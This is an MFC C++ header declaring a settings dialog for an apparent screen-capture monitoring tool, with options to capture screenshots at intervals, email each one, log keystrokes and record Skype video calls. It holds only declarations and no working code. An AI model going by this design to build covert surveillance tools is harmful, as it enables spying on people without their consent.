#if !defined(AFX_DLG_OPTIONSCAPTURE_H__312AAB15_448B_4A31_9740_4F0DF54B0001__INCLUDED_)
#define AFX_DLG_OPTIONSCAPTURE_H__312AAB15_448B_4A31_9740_4F0DF54B0001__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// Dlg_OptionsCapture.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CDlg_OptionsCapture dialog

class CDlg_OptionsCapture : public CPropertyPage
{
	DECLARE_DYNCREATE(CDlg_OptionsCapture)

// Construction
public:
	CDlg_OptionsCapture();
	~CDlg_OptionsCapture();

// Dialog Data
	//{{AFX_DATA(CDlg_OptionsCapture)
	enum { IDD = IDD_OPTIONS_CAPTURE };
	BOOL	_capturer_works;
	int		_capture_interval;
	BOOL	_email_each_screenshot;
	CString	_app_window_name;
	CString	_keystokes;
	BOOL	_capture_skype_video_calls;
	BOOL	_capture_on_keystore;
	int		_capture_skype_video_calls_int;
	//}}AFX_DATA


// Overrides
	// ClassWizard generate virtual function overrides
	//{{AFX_VIRTUAL(CDlg_OptionsCapture)
	public:
	virtual BOOL OnApply();
	virtual void OnOK();
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	// Generated message map functions
	//{{AFX_MSG(CDlg_OptionsCapture)
	afx_msg void OnCheck_EnableCapturer();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()

};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_DLG_OPTIONSCAPTURE_H__312AAB15_448B_4A31_9740_4F0DF54B0001__INCLUDED_)
